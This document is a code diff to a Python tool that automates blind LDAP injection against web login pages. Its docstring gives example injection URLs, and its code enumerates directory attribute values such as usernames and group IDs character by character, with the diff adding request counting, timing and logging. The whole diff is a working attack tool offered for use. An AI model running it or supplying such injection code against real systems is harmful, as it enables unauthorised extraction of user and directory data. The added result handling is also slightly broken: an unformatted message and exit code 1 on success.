@@ -1,6 +1,6 @@
 """
 example:
-python ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(name=*))%%00&password=' 'AUTHENTICATED AS'
+python ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(name=*))%%00&password=' 'AUTHENTICATED as'
 
 In this example, we inserted an expression into the param that will always
 return true if the parameter replaced by %s is true, in this case ennumerating
@@ -9,18 +9,20 @@ when %s is TRUE, and will not return it when FALSE.
 
 Strings inserted look like 'a*', 'b*', 'c*'
 
-Some values do not support wildcards, in which case you should use --no-wildcard
+Some LDAP attributes do not support wildcards, in which case you should use --no-wildcard
 
 non-wildcard example:
-python ldap-dumper.py --no-wildcard -a gidNumber -c 'digits' 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
+python ldap-dumper.py -N -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
 
 In this example, note how the %s needs to be placed right at the end of an
 always-true filter and its respective close parenthesis.
 
-Strings inserted look like "(|(gidNumber=0)(gidNumber=1)(gidNumber=2)(gidNumber=3)(gidNumber=4))..." (trimmed for brevity)
+Strings inserted look like
+"(|(gidNumber=0)(gidNumber=1)(gidNumber=2)(gidNumber=3)(gidNumber=4))..."
+(trimmed for brevity)
 
-NOTE: Remember to quote the URL because bash! And also remember that % needs to be escaped as %%,
-because python/printf.
+NOTE: Remember to quote the URL because bash! And also remember that % needs to
+be escaped as %%, because python/printf.
 
 CAVEAT: in wildcard search, if there are two users that begin with the same
 string, but one is larger than the other, only the largest one will be
@@ -36,9 +38,16 @@ http://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-e
 http://www.ietf.org/rfc/rfc1960.txt
 """
 
-import argparse, logging, string, requests, sys, itertools
+import argparse, logging, string, requests, sys, itertools, timeit
+
+class LdapGlobals():
+    start_time = timeit.default_timer()
+    total_requests = 0
+
+LDAP_GLOBALS = LdapGlobals()
 
 def request_true(url, true_string):
+    LDAP_GLOBALS.total_requests += 1
     logging.debug(url)
     response = requests.get(url)
     return true_string in response.text
@@ -67,9 +76,7 @@ def brute(base_url, true_string, charset):
             if exist:
                 logging.info("Valid initial values found: %s", exist)
             else :
-                err("""No initial values found! True string was never
-                    there... Maybe attribute does not support wildcard? see
-                    --no-wildcard. Otherwise, URL is non-conformant.""")
+                err("""No initial values found! True string was never there... Maybe attribute does not support wildcard? see --no-wildcard. Otherwise, URL is non-conformant.""")
         else:
             new_exist = []
             finished = True
@@ -135,7 +142,9 @@ def brute_nowild(base_url, true_string, charset, max_path_size, attribute_name, 
             looper = or_loop(or_subfilter)
             for filt in looper:
                 if request_true(base_url % filt, true_string):
-                    exist.append(filt[len(attribute_name)+2:-1])
+                    found = filt[len(attribute_name)+2:-1]
+                    logging.info("Found value %s" % found)
+                    exist.append(found)
 
     return exist
 
@@ -193,10 +202,17 @@ def charset_get(charset_name):
     return charset
 
 def succ(result):
+    total_time = (timeit.default_timer()) - LDAP_GLOBALS.start_time
+    time_info = "%ss total time, %s total HTTP requests" % (round(total_time, 3), LDAP_GLOBALS.total_requests)
     if result:
-        print("Valid values found:\n")
+        print("Valid values found (%s):\n" % time_info)
         for r in result:
             print(r)
+
+        sys.exit(1)
+    else:
+        print("No results found (%s.)")
+        sys.exit(1)
 
 def err(message):
     logging.warn(message)
@@ -219,7 +235,6 @@ if __name__ == '__main__':
     else :
         if not args.attribute_name :
             err("Attribute name is required for non-wildcard bruteforcing. Please specify it with --attribute-name.")
-
         valid_values = brute_nowild(args.URL, args.TRUE_STRING, charset, args.max_path_size, args.attribute_name, args.max_word_size)
 
     succ(valid_values)
